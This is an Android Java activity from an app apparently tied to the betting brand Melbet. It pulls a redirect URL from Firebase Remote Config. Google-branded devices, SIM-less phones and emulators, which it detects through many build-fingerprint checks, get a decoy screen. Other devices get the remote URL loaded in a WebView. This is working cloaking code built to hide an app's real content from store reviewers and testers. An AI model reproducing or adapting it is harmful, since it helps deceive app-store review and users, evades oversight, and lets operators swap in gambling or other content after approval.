package melbet.malbet.hispone;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

public class BlankActivity extends AppCompatActivity {
    private static final String URL_KEY = "url";
    private static final String URL_KEY_DEFAULT = "";
    private static final String TAG = "NavigateActivity";
    public FirebaseRemoteConfig remoteConfig;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(this);
        if (redirect(pref))
            return;

        remoteConfig = FirebaseRemoteConfig.getInstance();
        FirebaseRemoteConfigSettings configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setMinimumFetchIntervalInSeconds(3600)
                .build();
        remoteConfig.setConfigSettingsAsync(configSettings);

        remoteConfig.fetchAndActivate().addOnCompleteListener(x -> {
            if (x.isSuccessful()) {
                Log.d(TAG, "Firebase Remote config Fetch Succeeded");
                pref.edit().remove(URL_KEY).apply();
                String url = pref.getString(URL_KEY, remoteConfig.getString(URL_KEY));
                switchActivity(url);
            } else {
                Log.d(TAG, "Firebase Remote config Fetch failed");
            }
        });
    }

    private boolean redirect(SharedPreferences pref) {
        String url = pref.getString(URL_KEY, URL_KEY_DEFAULT);

        if (url.isEmpty())
            return false;

        switchActivity(url);

        return true;
    }

    private void switchActivity(String url) {
        Intent intent;
        if (url.isEmpty() || isGoogleDevice() || !hasSimCard() || isEmulator(this)) {
            intent = new Intent(BlankActivity.this, PlugActivity.class);
        } else {
            intent = new Intent(BlankActivity.this, WebViewActivity.class);
            intent.putExtra("url", url);
        }

        startActivity(intent);
    }

    public boolean hasSimCard() {
        TelephonyManager telMgr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        return telMgr.getSimState() != TelephonyManager.SIM_STATE_ABSENT;
    }

    public boolean isGoogleDevice() {
        return Build.BRAND.contains("google");
    }

    //from firebase-android-sdk
    public boolean isEmulator(Context context) {
        final String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        return androidId == null
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"))
                || Build.FINGERPRINT.startsWith("generic")
                || Build.FINGERPRINT.startsWith("unknown")
                || Build.HARDWARE.contains("goldfish")
                || Build.HARDWARE.contains("ranchu")
                || Build.MODEL.contains("google_sdk")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86")
                || Build.MANUFACTURER.contains("Genymotion")
                || Build.PRODUCT.contains("sdk_google")
                || Build.PRODUCT.contains("google_sdk")
                || Build.PRODUCT.contains("sdk")
                || Build.PRODUCT.contains("sdk_x86")
                || Build.PRODUCT.contains("vbox86p")
                || Build.PRODUCT.contains("emulator")
                || Build.PRODUCT.contains("simulator");
    }

    public App getApp() {
        return (App) getApplication();
    }
}